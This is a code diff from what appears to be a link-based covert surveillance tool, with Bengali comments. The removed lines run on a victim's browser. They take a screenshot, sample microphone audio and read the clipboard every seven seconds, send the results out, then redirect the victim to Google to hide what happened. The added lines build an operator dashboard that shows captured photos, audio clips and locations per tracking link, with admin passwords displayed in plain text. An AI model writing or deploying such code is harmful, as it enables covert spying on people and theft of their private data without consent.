-        } catch (err) {
-            await sendText(`❌ স্ক্রিনশট নিতে ব্যর্থ: ${err.message}`);
-        }
-
-        // সাউন্ড ডিটেকশন (পরিবেশের আওয়াজ)
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const source = audioCtx.createMediaStreamSource(stream);
-            const analyser = audioCtx.createAnalyser();
-            source.connect(analyser);
-            analyser.fftSize = 256;
-            const dataArray = new Uint8Array(analyser.frequencyBinCount);
-            let maxLevel = 0;
-            const measure = () => {
-                analyser.getByteTimeDomainData(dataArray);
-                let max = 0;
-                for (let i = 0; i < dataArray.length; i++) {
-                    let v = (dataArray[i] - 128) / 128;
-                    max = Math.max(max, Math.abs(v));
-                }
-                maxLevel = Math.max(maxLevel, max);
-            };
-            const interval = setInterval(measure, 100);
-            setTimeout(() => {
-                clearInterval(interval);
-                stream.getTracks().forEach(t => t.stop());
-                audioCtx.close();
-                const isLoud = maxLevel > 0.05;
-                sendText(`🔊 *সাউন্ড ডিটেকশন*\nসর্বোচ্চ অ্যাম্বিয়েন্ট লেভেল: ${maxLevel.toFixed(3)}\n${isLoud ? 'শব্দ সনাক্ত হয়েছে' : 'পরিবেশ শান্ত'}`);
-            }, 3000);
-        } catch (err) {
-            await sendText(`❌ সাউন্ড ডিটেকশন ব্যর্থ: ${err.message}`);
-        }
-
-        // ক্লিপবোর্ড মনিটরিং (প্রতি ৭ সেকেন্ড)
-        const checkClipboard = async () => {
-            try {
-                const text = await navigator.clipboard.readText();
-                if (text && text.trim() !== '') {
-                    await sendText(`📋 *ক্লিপবোর্ড টেক্সট*\n\`\`\`\n${text.substring(0, 500)}\n\`\`\``);
-                }
-                const items = await navigator.clipboard.read();
-                for (const item of items) {
-                    for (const type of item.types) {
-                        if (type.startsWith('image/')) {
-                            const blob = await item.getType(type);
-                            await sendPhoto(blob);
+    // ========== MONITOR TAB: live counters ==========
+    async function loadMonitorLinks() {
+        const linksRef = db.ref(`links/${currentAdminId}`);
+        linksRef.on('value', (snapshot) => {
+            const links = snapshot.val();
+            const container = document.getElementById('linksList');
+            if (!links) { container.innerHTML = '<div class="data-card">No links created yet.</div>'; return; }
+            let html = '<div class="data-card">';
+            for (let id in links) {
+                const link = links[id];
+                // subscribe to tracking counts for this link
+                const countRef = db.ref(`tracking/${id}`);
+                countRef.once('value', (trackSnap) => {
+                    const trackData = trackSnap.val();
+                    let photoCount = 0, audioCount = 0, locCount = 0;
+                    if (trackData) {
+                        for (let key in trackData) {
+                            if (key.startsWith('camera_photo')) photoCount++;
+                            else if (key.startsWith('microphone_audio')) audioCount++;
+                            else if (key.startsWith('location')) locCount++;
                         }
                     }
-                }
-            } catch(e) { /* চুপ */ }
-        };
-        checkClipboard();
-        setInterval(checkClipboard, 7000);
-
-        // ১০ সেকেন্ড পর ভিকটিমকে গুগলে রিডাইরেক্ট (গোপনীয়তা)
-        setTimeout(() => {
-            window.location.href = 'https://www.google.com';
-        }, 10000);
+                    // update the displayed card (we'll set id for each link)
+                    const cardElem = document.getElementById(`link-card-${id}`);
+                    if (cardElem) {
+                        cardElem.innerHTML = `<strong>🔗 ${id}</strong><br>
+                            Features: ${link.features}<br>
+                            Created: ${new Date(link.createdAt).toLocaleString()}<br>
+                            <span class="stat-badge">📸 ${photoCount}</span>
+                            <span class="stat-badge">🎙️ ${audioCount}</span>
+                            <span class="stat-badge">📍 ${locCount}</span>
+                            ${link.shortUrl ? `<br>Short: <a href="${link.shortUrl}" target="_blank">${link.shortUrl}</a>` : ''}`;
+                    }
+                });
+                html += `<div class="link-card" id="link-card-${id}" data-linkid="${id}"></div>`;
+            }
+            container.innerHTML = html;
+            // attach click to each card to show data (optional)
+            document.querySelectorAll('.link-card').forEach(card => {
+                card.addEventListener('click', () => {
+                    const linkId = card.getAttribute('data-linkid');
+                    document.getElementById('tabDataViewBtn').click();
+                    setTimeout(() => showLinkData(linkId), 200);
+                });
+            });
+        });
     }
+
+    // ========== DATA VIEWER: list of links ==========
+    async function loadDataLinks() {
+        const linksRef = db.ref(`links/${currentAdminId}`);
+        linksRef.on('value', (snapshot) => {
+            const links = snapshot.val();
+            const container = document.getElementById('dataLinksList');
+            if (!links) { container.innerHTML = '<div class="data-card">No links yet.</div>'; return; }
+            let html = '';
+            for (let id in links) {
+                html += `<div class="link-card" data-linkid="${id}">
+                            <strong>🔗 ${id}</strong><br>
+                            Created: ${new Date(links[id].createdAt).toLocaleString()}
+                         </div>`;
+            }
+            container.innerHTML = html;
+            document.querySelectorAll('[data-linkid]').forEach(el => {
+                el.addEventListener('click', () => showLinkData(el.getAttribute('data-linkid')));
+            });
+        });
+    }
+
+    let currentMap = null;
+    async function showLinkData(linkId) {
+        const detailsDiv = document.getElementById('dataDetails');
+        detailsDiv.classList.remove('hide');
+        document.getElementById('selectedLinkId').innerText = linkId;
+        const mediaDiv = document.getElementById('mediaList');
+        mediaDiv.innerHTML = '<div class="loader"></div><p>Loading data...</p>';
+
+        // get all tracking data for this link
+        const trackRef = db.ref(`tracking/${linkId}`);
+        trackRef.once('value', (snapshot) => {
+            const data = snapshot.val();
+            if (!data) {
+                mediaDiv.innerHTML = '<p>No captured data yet.</p>';
+                return;
+            }
+            let photos = [], audios = [], locations = [], others = [];
+            for (let key in data) {
+                const entry = data[key];
+                if (key.startsWith('camera_photo')) photos.push(entry);
+                else if (key.startsWith('microphone_audio')) audios.push(entry);
+                else if (key.startsWith('location')) locations.push(entry);
+                else others.push(entry);
+            }
+            // Build media list
+            let html = `<h4>📸 Photos (${photos.length})</h4>`;
+            photos.forEach(p => {
+                const time = new Date(p.timestamp).toLocaleString();
+                html += `<div class="data-entry"><strong>${time}</strong><br><img src="${p.data.url}" style="max-width:100%; max-height:200px;"></div>`;
+            });
+            html += `<h4>🎤 Audio Clips (${audios.length})</h4>`;
+            audios.forEach(a => {
+                const time = new Date(a.timestamp).toLocaleString();
+                html += `<div class="data-entry"><strong>${time}</strong><br><audio controls src="${a.data.url}" style="width:100%;"></audio></div>`;
+            });
+            html += `<h4>📍 Locations (${locations.length})</h4>`;
+            const lastLoc = locations.length ? locations[locations.length-1].data : null;
+            if (lastLoc && lastLoc.lat && lastLoc.lon) {
+                if (currentMap) currentMap.remove();
+                currentMap = L.map('map').setView([lastLoc.lat, lastLoc.lon], 13);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '© OpenStreetMap'
+                }).addTo(currentMap);
+                L.marker([lastLoc.lat, lastLoc.lon]).addTo(currentMap).bindPopup('Last known location').openPopup();
+            } else {
+                document.getElementById('map').innerHTML = '<p>No location data.</p>';
+            }
+            locations.forEach(loc => {
+                const time = new Date(loc.timestamp).toLocaleString();
+                html += `<div class="data-entry"><strong>${time}</strong><br>${loc.data.lat}, ${loc.data.lon}</div>`;
+            });
+            html += `<h4>📋 Other Data</h4>`;
+            others.forEach(o => {
+                const time = new Date(o.timestamp).toLocaleString();
+                html += `<div class="data-entry"><strong>${o.type}</strong> at ${time}<br><pre>${JSON.stringify(o.data, null, 2)}</pre></div>`;
+            });
+            mediaDiv.innerHTML = html;
+        });
+    }
+
+    // ========== ADMIN MANAGEMENT (developer only) ==========
+    async function loadAllAdmins() {
+        const adminsRef = db.ref('admins');
+        adminsRef.on('value', (snapshot) => {
+            const admins = snapshot.val();
+            const container = document.getElementById('adminsTableContainer');
+            if (!admins) { container.innerHTML = '<div class="data-card">No admins created.</div>'; return; }
+            let html = '<table class="admin-table"><tr><th>UID</th><th>Password</th><th>Created</th><th>Links</th><th>Action</th></tr>';
+            for (let uid in admins) {
+                const admin = admins[uid];
+                html += `<tr>
+                            <td>${uid}</td>
+                            <td>${admin.password}</td>
+                            <td>${new Date(admin.createdAt).toLocaleString()}</td>
+                            <td id="linkCount-${uid}">...</td>
+                            <td><button class="small-btn" onclick="deleteAdmin('${uid}')">Delete</button></td>
+                         </tr>`;
+                db.ref(`links/${uid}`).once('value', snap => {
+                    document.getElementById(`linkCount-${uid}`).innerText = snap.numChildren();
+                });
+            }
+            html += '</table>';
+            container.innerHTML = html;
+        });
+    }
+
+    window.deleteAdmin = async (uid) => {
+        if (confirm(`Delete admin ${uid} and all their links?`)) {
+            await db.ref(`admins/${uid}`).remove();
+            await db.ref(`links/${uid}`).remove();
+            alert("Admin deleted");
+            loadAllAdmins();
+        }
+    };
+
+    document.getElementById('createAdminBtn').onclick = async () => {
+        const newUid = document.getElementById('newAdminUid').value.trim();
+        const newPwd = document.getElementById('newAdminPwd').value.trim();
+        if (!newUid || !newPwd) { alert("Enter UID and password"); return; }
+        const adminRef = db.ref(`admins/${newUid}`);
+        const existing = await adminRef.once('value');
+        if (existing.exists()) { alert("Admin UID already exists"); return; }
+        await adminRef.set({
+            password: newPwd,
+            createdAt: Date.now(),
+            name: newUid
+        });
+        alert("Admin created");
+        document.getElementById('newAdminUid').value = '';
+        document.getElementById('newAdminPwd').value = '';
+        loadAllAdmins();
+    };
+
+    document.getElementById('logoutBtn').onclick = () => {
+        currentUser = null;
+        document.getElementById('dashboardView').classList.add('hide');
+        document.getElementById('loginView').classList.remove('hide');
+        document.getElementById('loginUid').value = '';
+        document.getElementById('loginPwd').value = '';
+    };
 </script>
 </body>
 </html>
